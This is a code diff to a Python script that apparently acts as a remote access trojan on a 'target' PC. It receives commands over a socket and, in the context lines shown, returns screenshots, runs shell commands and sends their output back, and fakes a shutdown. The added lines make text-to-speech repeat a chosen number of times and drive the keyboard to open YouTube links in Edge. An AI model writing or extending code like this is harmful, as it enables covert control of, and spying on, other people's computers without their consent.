@@ -53,8 +53,18 @@ def main():
                         client.sendall(buffer.getvalue())
                     if final_data.startswith("speak"):
                         speak = final_data.replace("speak ","")
-                        pyttsx3.speak(speak)
-                        client.send(f"Successfully Speak The Given Text on target".encode("utf-8"))
+                        times = ""
+                        for i in reversed(speak):
+                            if i.isdigit():
+                                times = times+i
+                            else:
+                                break
+                        final_speak = speak.replace( times,"")
+                        j = 1
+                        while j <= int(times):
+                            pyttsx3.speak(final_speak)
+                            j = j+1
+                        client.send(f"Successfully Speak The Given Text on target on {times} Time".encode("utf-8"))
                     if final_data.startswith("shutdown"):
                         client.send("Succesfully Shutdown The PC".encode("utf-8"))
                         pyautogui.hotkey("win+d")
@@ -80,6 +90,17 @@ def main():
                                 client.send(output_cmd.stdout.encode("utf-8"))
                             except Exception as e:
                                 client.send(f"cmd Error : {e}".encode("utf-8"))
+                    if final_data.startswith("youtube"):
+                        link = final_data.replace("youtube ","")
+                        pyautogui.press("win")
+                        time.sleep(0.5)
+                        pyautogui.write("microsoft edge",interval=0.1)
+                        time.sleep(1)
+                        pyautogui.press("enter")
+                        time.sleep(4)
+                        pyautogui.write(link)
+                        time.sleep(1)
+                        pyautogui.press("enter")
             except Exception as e:
                 print("Client is disconnected")
                 print(f"Error : {e}")
